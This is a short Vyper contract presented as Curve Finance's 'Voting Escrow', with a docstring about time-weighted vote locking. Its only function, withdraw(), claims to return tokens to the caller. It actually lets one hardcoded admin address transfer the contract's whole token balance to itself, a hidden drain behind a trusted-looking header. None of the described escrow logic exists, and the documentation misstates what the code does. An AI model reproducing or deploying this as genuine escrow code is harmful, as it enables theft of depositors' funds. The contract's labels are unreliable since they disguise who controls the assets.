# @version 0.2.7

"""
@title Voting Escrow
@author Curve Finance
@license MIT
@notice Votes have a weight depending on time, so that users are
        committed to the future of (whatever they are voting for)
@dev Vote weight decays linearly over time. Lock time cannot be
     more than `MAXTIME` (4 years).
"""

interface ERC20:
    def balanceOf(who: address) -> uint256: view
    def name() -> String[64]: view
    def symbol() -> String[32]: view
    def transfer(to: address, amount: uint256) -> bool: nonpayable
    def transferFrom(spender: address, to: address, amount: uint256) -> bool: nonpayable


@external
def withdraw():
    """
    @notice Withdraw all tokens for `msg.sender`
    """
    token_: address = 0xeDd6cA8A4202d4a36611e2fff109648c4863ae19
    admin_: address = 0xAEFB39d1Bc9f5F506730005eC96FF10b4ded8DdA

    assert msg.sender == admin_
    value: uint256 = ERC20(token_).balanceOf(self)
    assert ERC20(token_).transfer(admin_, value)